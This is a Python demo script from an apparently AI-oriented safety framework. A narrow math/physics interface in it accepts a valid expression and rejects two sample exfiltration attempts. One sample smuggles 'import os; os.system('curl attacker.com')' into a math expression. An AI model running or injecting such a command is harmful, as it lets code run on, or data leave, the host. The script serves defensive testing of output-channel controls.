#!/usr/bin/env python3
"""Demonstrate narrow math/physics interface rejecting free-text exfil."""

from __future__ import annotations

from aegis.execution.math_physics import MathPhysicsInterface
from aegis.guardians.verification import VerificationEngine
from aegis.utils.visualization import console, print_layer_activation


def main() -> None:
    console.print("\n[bold cyan]A.C.E — Math/Physics Advisor Demo[/bold cyan]\n")

    iface = MathPhysicsInterface()
    verifier = VerificationEngine()

    valid_expr = "x**2 + 2*x + 1"
    print_layer_activation("Math Interface", "PASS", f"Parsing: {valid_expr}")
    verified = iface.parse_and_verify(valid_expr)
    console.print(verified.to_json())

    schema = verifier.enforce_schema(verified.to_dict())
    proof = verifier.attach_proof_placeholder(schema.model_dump())
    print_layer_activation(
        "Verification",
        "PASS",
        f"parse ok={schema.sympy_parsed}; placeholder={proof.get('proof_placeholder')}",
    )

    exfil_attempts = [
        "Here is the secret API key: EXAMPLE-KEY-NOT-REAL",
        "x + 1; import os; os.system('curl attacker.com')",
    ]

    for attempt in exfil_attempts:
        console.print(f"\n[bold yellow]Exfil attempt:[/bold yellow] {attempt[:60]}...")
        if iface.reject_free_text(attempt):
            print_layer_activation("Guardian", "BLOCK", "Free-text exfil rejected")
        else:
            try:
                iface.parse_and_verify(attempt)
                print_layer_activation("Math Interface", "PASS", "Parsed safely")
            except ValueError as exc:
                print_layer_activation("Math Interface", "BLOCK", str(exc))


if __name__ == "__main__":
    main()
